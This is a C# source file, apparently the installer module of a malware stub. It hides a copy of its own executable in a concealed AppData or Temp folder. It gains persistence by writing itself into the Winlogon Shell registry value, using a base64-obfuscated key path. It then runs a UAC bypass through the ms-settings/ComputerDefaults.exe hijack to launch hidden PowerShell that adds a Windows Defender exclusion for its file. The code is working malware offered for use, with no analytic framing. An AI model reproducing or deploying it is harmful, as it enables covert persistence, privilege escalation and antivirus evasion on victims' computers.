using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Plugin.Stub
{
    public static class Installer
    {
        public static FileInfo FileName;

        public static DirectoryInfo DirectoryName;

        public static void Run(string path, string folder, string filename, string wdex)
        {
            FileName = new FileInfo(filename);
            if (path == "0")
                DirectoryName =
                    new DirectoryInfo(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                            folder));
            if (path == "1")
                DirectoryName =
                    new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        folder));
            if (path == "2") DirectoryName = new DirectoryInfo(Path.Combine(Path.GetTempPath(), folder));
            if (IsInstalled()) return;
            try
            {
                CreateDirectory();
                InstallFile();
                InstallRegistry();
                if (wdex == "True")
                    try
                    {
                        ExclusionWD();
                    }
                    catch
                    {
                    }
            }
            catch
            {
            }
        }

        public static bool IsInstalled()
        {
            if (Application.ExecutablePath == Path.Combine(DirectoryName.FullName, FileName.Name)) return true;
            return false;
        }

        public static void CreateDirectory()
        {
            if (!DirectoryName.Exists) DirectoryName.Create();
            DirectoryName.Attributes = FileAttributes.Hidden;
        }

        public static void InstallFile()
        {
            var text = Path.Combine(DirectoryName.FullName, FileName.Name);
            if (FileName.Exists)
            {
                var processes = Process.GetProcesses();
                foreach (var process in processes)
                    try
                    {
                        if (process.MainModule.FileName == text) process.Kill();
                    }
                    catch
                    {
                    }

                File.Delete(text);
                Thread.Sleep(250);
            }

            var fileStream = new FileStream(text, FileMode.Create, FileAccess.Write);
            var array = File.ReadAllBytes(Application.ExecutablePath);
            fileStream.Write(array, 0, array.Length);
        }

        public static void InstallRegistry()
        {
            if (GetRegKey() == null)
            {
                var bytes = Convert.FromBase64String(
                    "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25c");
                var @string = Encoding.UTF8.GetString(bytes);
                var registryKey = Registry.CurrentUser.CreateSubKey(@string);
                registryKey.SetValue("Shell", "explorer.exe, " + Path.Combine(DirectoryName.FullName, FileName.Name));
                registryKey.Close();
            }
            else if (!GetRegKey().Contains(Path.Combine(DirectoryName.FullName, FileName.Name)))
            {
                var text = GetRegKey().Substring(GetRegKey().Length - 1, 1);
                text = !(text == ",")
                    ? GetRegKey() + "," + Path.Combine(DirectoryName.FullName, FileName.Name) + ","
                    : GetRegKey() + Path.Combine(DirectoryName.FullName, FileName.Name) + ",";
                var bytes2 =
                    Convert.FromBase64String(
                        "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=");
                var string2 = Encoding.UTF8.GetString(bytes2);
                Registry.CurrentUser.OpenSubKey(string2, true).SetValue("Shell", text);
            }
        }

        public static void ExclusionWD()
        {
            try
            {
                var registryKey =
                    Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
                registryKey.SetValue("",
                    "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command Add-MpPreference -ExclusionPath '" +
                    Path.Combine(DirectoryName.FullName, FileName.Name) + "'");
                registryKey.Close();
                var registryKey2 =
                    Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
                registryKey2.SetValue("DelegateExecute", "");
                registryKey2.Close();
                Process.Start("C:\\Windows\\System32\\ComputerDefaults.exe");
                Thread.Sleep(1000);
            }
            catch
            {
            }
        }

        public static string GetRegKey()
        {
            try
            {
                var bytes = Convert.FromBase64String(
                    "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25c");
                var @string = Encoding.UTF8.GetString(bytes);
                return Registry.CurrentUser.OpenSubKey(@string).GetValue("Shell").ToString();
            }
            catch
            {
                return null;
            }
        }
    }
}